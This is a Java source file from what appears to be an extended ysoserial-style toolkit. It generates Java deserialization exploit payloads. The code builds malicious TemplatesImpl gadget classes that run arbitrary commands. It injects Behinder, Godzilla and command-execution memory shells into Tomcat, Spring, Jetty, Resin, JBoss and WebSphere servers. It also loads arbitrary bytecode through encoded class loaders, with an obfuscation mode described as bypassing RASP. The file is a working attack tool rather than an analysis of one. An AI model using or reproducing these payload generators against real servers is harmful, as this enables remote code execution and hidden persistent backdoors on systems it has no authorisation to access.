package org.su18.ysuserial.payloads.util;


import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
import static org.su18.ysuserial.GeneratePayload.IS_INHERIT_ABSTRACT_TRANSLET;
import static org.su18.ysuserial.GeneratePayload.IS_OBSCURE;
import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.Serializable;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.zip.GZIPOutputStream;

import javassist.*;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.wicket.util.file.Files;


@SuppressWarnings({
		"restriction", "rawtypes", "unchecked"
})
public class Gadgets {

	static {
		// special case for using TemplatesImpl gadgets with a SecurityManager enabled
		System.setProperty(DESERIALIZE_TRANSLET, "true");

		// for RMI remote loading
		System.setProperty("java.rmi.server.useCodebaseOnly", "false");
	}

	public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

	// required to make TemplatesImpl happy
	public static class CheckCPUTime implements Serializable {

		private static final long serialVersionUID = 8207363842866235160L;
	}


	public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
		return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
	}


	public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
		return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
	}


	public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
		final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
		allIfaces[0] = iface;
		if (ifaces.length > 0) {
			System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
		}
		return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
	}


	public static Map<String, Object> createMap(final String key, final Object val) {
		final Map<String, Object> map = new HashMap<String, Object>();
		map.put(key, val);
		return map;
	}


	public static Object createTemplatesImpl(String command) throws Exception {
		command = command.trim();

		String   packageName = "org.su18.ysuserial.payloads.templates.";
		Class<?> clazz;
		Class    tplClass;
		Class    abstTranslet;
		Class    transFactory;

		// 兼容不同 JDK 版本
		if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
			tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
			abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
			transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
		} else {
			tplClass = TemplatesImpl.class;
			abstTranslet = AbstractTranslet.class;
			transFactory = TransformerFactoryImpl.class;
		}

		// 支持单双引号
		if (command.startsWith("'") || command.startsWith("\"")) {
			command = command.substring(1, command.length() - 1);
		}


		// 如果命令以 EX- 开头（Extra 特殊功能），根据想使用的不同类获取不同的 class 模板进行加载获取不同的功能
		if (command.startsWith("EX-")) {
			command = command.substring(3);
			String type = "";
			String name = "";

			// 如果命令以 MS 开头，则代表是注入内存马
			if (command.startsWith("MS-")) {
				command = command.substring(3);
				packageName += "memshell.";
				String prefix = command.substring(0, 2).toLowerCase();
				switch (prefix) {
					case "tf":
					case "tl":
					case "ts":
					case "tw":
					case "te":
					case "tu":
						packageName += "tomcat.";
						break;
					case "sp":
						packageName += "spring.";
						break;
					case "jf":
					case "js":
						packageName += "jetty.";
						break;
					case "rf":
					case "rs":
						packageName += "resin.";
						break;
					case "jb":
						packageName += "jboss.";
						break;
					case "ws":
						packageName += "websphere.";
						break;
				}

				if (command.contains("-")) {
					String[] commands = command.split("[-]");
					name = commands[0];
					type = command.substring(command.indexOf("-") + 1);
				} else {
					name = command;
				}

				clazz = Class.forName(packageName + name, false, Gadgets.class.getClassLoader());
			} else {
				// 这里不能让它初始化，不然从线程中获取 WebappClassLoaderBase 时会强制类型转换异常。
				clazz = Class.forName(packageName + command, false, Gadgets.class.getClassLoader());
			}

			return createTemplatesImpl(clazz, null, null, type, tplClass, abstTranslet, transFactory);
			// 如果命令以 LF- 开头 （Local File），则程序可以生成一个能加载本地指定类字节码并初始化的逻辑，后面跟文件路径-类名
		} else if (command.startsWith("LF-")) {
			command = command.substring(3);
			byte[] bs        = Files.readBytes(new File(command.split("[-]")[0]));
			String className = command.split("[-]")[1];
			return createTemplatesImpl(null, null, bs, className, tplClass, abstTranslet, transFactory);
		} else {
			// 否则就是普通的命令执行
			return createTemplatesImpl(null, command, null, null, tplClass, abstTranslet, transFactory);
		}
	}


	public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, String cName, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
		final T   templates  = tplClass.newInstance();
		byte[]    classBytes = new byte[0];
		ClassPool pool       = ClassPool.getDefault();

		pool.insertClassPath(new ClassClassPath(abstTranslet));
		CtClass superClass = pool.get(abstTranslet.getName());

		CtClass ctClass = null;

		// 如果 Command 不为空，则是普通的命令执行
		if (command != null) {
			String time = String.valueOf(System.nanoTime());

			// 如果指定短 payload，则动态创建一个超级短的恶意类
			if (!IS_OBSCURE) {
				ctClass = pool.makeClass("A" + time);
				// 创建无参构造方法
				CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
				ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
				ctClass.addConstructor(ctConstructor);

				// 如果没有指定，则默认使用带有绕过 RASP 功能的 CommandTemplate 进行执行
			} else {
				// 修改类名
				ctClass = pool.get("org.su18.ysuserial.payloads.templates.CommandTemplate");

				// 由于使用了 Thread 修改内部类
				String className = ctClass.getName();
				ctClass.setName(className + time);
				// 修改字段
				String cmd = "cmd = \"" + command + "\";";
				ctClass.makeClassInitializer().insertBefore(cmd);

			}

			// 如果全局配置继承，再设置父类
			if (IS_INHERIT_ABSTRACT_TRANSLET) {
				ctClass.setSuperclass(superClass);
			}

			classBytes = ctClass.toBytecode();
		}

		// 如果 myClass 不为空，则说明指定了一些 Class 执行特殊功能
		if (myClass != null) {
			String className = myClass.getName();
			ctClass = pool.get(className);

			// 如果是打入 Spring Controller 类型的内存马，则修改 SpringInterceptorTemplate 创建类字节码，并写入 SpringInterceptorMS 中
			if (className.contains("SpringInterceptorMS")) {

				if (IS_INHERIT_ABSTRACT_TRANSLET) {
					ctClass.setSuperclass(superClass);
				}

				String  target              = "org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorTemplate";
				CtClass springTemplateClass = pool.get(target);
				// 类名后加时间戳
				String clazzName = target + System.nanoTime();
				springTemplateClass.setName(clazzName);
				String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
				// 修改b64字节码
				String b64content = "b64=\"" + encode + "\";";
				ctClass.makeClassInitializer().insertBefore(b64content);
				// 修改 SpringInterceptorMemShell 随机命名 防止二次打不进去
				String clazzNameContent = "clazzName=\"" + clazzName + "\";";
				ctClass.makeClassInitializer().insertBefore(clazzNameContent);
				ctClass.setName(className + System.nanoTime());
				classBytes = ctClass.toBytecode();

			} else if (className.contains("RMIBindTemplate")) {
				// 如果是 RMI 内存马，则修改其中的 registryPort、bindPort、serviceName，插入关键方法

				if (IS_INHERIT_ABSTRACT_TRANSLET) {
					ctClass.setSuperclass(superClass);
				}

				String[] parts = cName.split("-");

				if (parts.length < 3) {
					// BindPort 写 0 就是随机端口
					throw new IllegalArgumentException("Command format is: EX-MS-RMIBindTemplate-<RegistryPort>-<BindPort>-<ServiceName>");
				}

				// 插入关键参数
				String rPortString = "port=" + parts[0] + ";";
				ctClass.makeClassInitializer().insertBefore(rPortString);
				String bPort = "bindPort=" + parts[1] + ";";
				ctClass.makeClassInitializer().insertBefore(bPort);
				String sName = "serviceName=\"" + parts[2] + "\";";
				ctClass.makeClassInitializer().insertBefore(sName);

				ctClass.setInterfaces(new CtClass[]{pool.get("javax.management.remote.rmi.RMIConnection"), pool.get("java.io.Serializable")});

				// 插入目标执行类
				insertCMD(ctClass);
				ctClass.addMethod(CtMethod.make("public String getDefaultDomain(javax.security.auth.Subject subject) throws java.io.IOException {return new String(execCmd(((java.security.Principal)subject.getPrincipals().iterator().next()).getName()).toByteArray());}", ctClass));

				ctClass.setName(className + System.nanoTime());
				classBytes = ctClass.toBytecode();
			} else {
				// 其他的通过类名自定义加载，NeoReg 不改类名
				if (!"org.su18.ysuserial.payloads.templates.TLNeoRegFromThread".equals(className)) {
					// 测试方便调试暂时不改类名
					ctClass.setName(className + System.nanoTime());
				}

				// 配置恶意类不继承 AbstractTranslet 时，无需使用 ClassLoaderTemplate 进行封装
				// 否则在恶意类自身存在父类时，无法继承 AbstractTranslet，需要使用 ClassLoaderTemplate 进行封装

				// websocket/executor 型内存马，使用 ClassLoaderTemplate 加载
				if (className.contains("WSMS")) {
					insertKeyMethod(ctClass, "ws");

					if (IS_INHERIT_ABSTRACT_TRANSLET) {
						bytes = ctClass.toBytecode();
						cName = ctClass.getName();
					}

				} else if (className.contains("UGMS")) {
					insertKeyMethod(ctClass, "upgrade");

					if (IS_INHERIT_ABSTRACT_TRANSLET) {
						ctClass.setSuperclass(superClass);
					}

				} else if (className.contains("EXMS")) {
					insertKeyMethod(ctClass, "execute");

					if (IS_INHERIT_ABSTRACT_TRANSLET) {
						bytes = ctClass.toBytecode();
						cName = ctClass.getName();
					}

					// 内存马指定类型进行写入恶意逻辑
				} else if (!Objects.equals(cName, "")) {

					if (IS_INHERIT_ABSTRACT_TRANSLET) {
						ctClass.setSuperclass(superClass);
					}

					insertKeyMethod(ctClass, cName);
				} else {
					if (IS_INHERIT_ABSTRACT_TRANSLET) {
						ctClass.setSuperclass(superClass);
					}
				}

				// 写出和加载测试
//				writeClassToFile(cName, bytes);
//				loadClassTest(bytes, cName);

				classBytes = ctClass.toBytecode();
			}
		}
		// 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
		if (bytes != null) {
			ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
			ctClass.setName(ctClass.getName() + System.nanoTime());
			ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
			GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
			gzipOutputStream.write(bytes);
			gzipOutputStream.close();
			String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
			String className = "className=\"" + cName + "\";";
			ctClass.makeClassInitializer().insertBefore(content);
			ctClass.makeClassInitializer().insertBefore(className);

			if (IS_INHERIT_ABSTRACT_TRANSLET) {
				ctClass.setSuperclass(superClass);
			}

			classBytes = ctClass.toBytecode();

		}

		// 写出 class 试试
//		writeClassToFile(ctClass.getName(), classBytes);

		// 加载 class 试试
//		loadClassTest(classBytes, ctClass.getName());

		// 写入前将 classBytes 中的类标识设为 JDK 1.6 的版本号
		classBytes[7] = 49;

		// 恶意类是否继承 AbstractTranslet
		if (IS_INHERIT_ABSTRACT_TRANSLET) {
			// inject class bytes into instance
			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
		} else {
			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(CheckCPUTime.class)});
			// 当 _transletIndex >= 0 且 classCount 也就是生成类的数量大于 1 时，不需要继承 AbstractTranslet
			Reflections.setFieldValue(templates, "_transletIndex", 0);
		}

		// required to make TemplatesImpl happy
		Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
		Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
		return templates;
	}


	public static HashMap makeMap(Object v1, Object v2) throws Exception {
		HashMap s = new HashMap();
		Reflections.setFieldValue(s, "size", 2);
		Class nodeC;
		try {
			nodeC = Class.forName("java.util.HashMap$Node");
		} catch (ClassNotFoundException e) {
			nodeC = Class.forName("java.util.HashMap$Entry");
		}
		Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
		Reflections.setAccessible(nodeCons);

		Object tbl = Array.newInstance(nodeC, 2);
		Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
		Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
		Reflections.setFieldValue(s, "table", tbl);
		return s;
	}

	public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {

		// 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
		String name = ctClass.getName();
		name = name.substring(name.lastIndexOf(".") + 1);
		boolean isTomcat = name.startsWith("T");

		// 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
		String method = "";

		CtClass[] classes = ctClass.getInterfaces();
		for (CtClass aClass : classes) {
			String iName = aClass.getName();
			if (iName.equals("javax.servlet.Servlet")) {
				method = "service";
				break;
			} else if (iName.equals("javax.servlet.Filter")) {
				method = "doFilter";
				break;
			} else if (iName.equals("javax.servlet.ServletRequestListener")) {
				method = "requestInitializedHandle";
				isTomcat = false;
				break;
			} else if (iName.equals("javax.websocket.MessageHandler$Whole")) {
				method = "onMessage";
				isTomcat = false;
				break;
			} else if (iName.equals("org.apache.coyote.UpgradeProtocol")) {
				method = "accept";
				isTomcat = false;
				break;
			}
		}

		CtClass supClass = ctClass.getSuperclass();
		if (supClass != null && supClass.getName().equals("org.apache.tomcat.util.threads.ThreadPoolExecutor")) {
			method = "execute";
			isTomcat = false;
		}

		switch (type) {
			// 冰蝎类型的内存马
			case "bx":
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));

				if (isTomcat) {
					insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL_FOR_TOMCAT));
				} else {
					insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL));
				}
				break;
			// 哥斯拉类型的内存马
			case "gz":
				ctClass.addField(CtField.make("Class payload ;", ctClass));
				ctClass.addField(CtField.make("String xc = \"7ff9fe91aaa7d3aa\";", ctClass));

				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(MD5), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));

				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL));
				break;
			// 哥斯拉 raw 类型的内存马
			case "gzraw":
				ctClass.addField(CtField.make("Class payload ;", ctClass));
				ctClass.addField(CtField.make("String xc = \"7ff9fe91aaa7d3aa\";", ctClass));

				ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));

				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
				break;
//			// Tomcat Executor cmd 执行内存马
			case "execute":
				ctClass.addField(CtField.make("public static String TAG = \"su18\";", ctClass));
				insertCMD(ctClass);
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_REQUEST), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_RESPONSE), ctClass));

				insertMethod(ctClass, method, Utils.base64Decode(EXECUTOR_SHELL));
				break;
			// websocket cmd 执行内存马
			case "ws":
				insertCMD(ctClass);
				insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
				break;
			case "upgrade":
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
				insertCMD(ctClass);
				insertMethod(ctClass, method, Utils.base64Decode(UPGRADE_SHELL));
				break;
			// 命令执行回显内存马
			case "cmd":
			default:
				insertCMD(ctClass);

				if (isTomcat) {
					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_TOMCAT));
				} else {
					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL));
				}

				break;
		}
	}

	public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
		// 根据传入的不同参数，在不同方法中插入不同的逻辑
		CtMethod cm = ctClass.getDeclaredMethod(method);
		cm.setBody(payload);
	}

	/**
	 * 向指定类中写入命令执行方法 execCmd
	 * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
	 *
	 * @param ctClass 指定类
	 * @throws Exception 抛出异常
	 */
	public static void insertCMD(CtClass ctClass) throws Exception {

		if (IS_OBSCURE) {
			ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
			ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
			ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
			try {
				ctClass.getDeclaredMethod("getFieldValue");
			} catch (NotFoundException e) {
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
			}
			ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD_OBSCURE), ctClass));
		} else {
			ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD), ctClass));
		}
	}
}
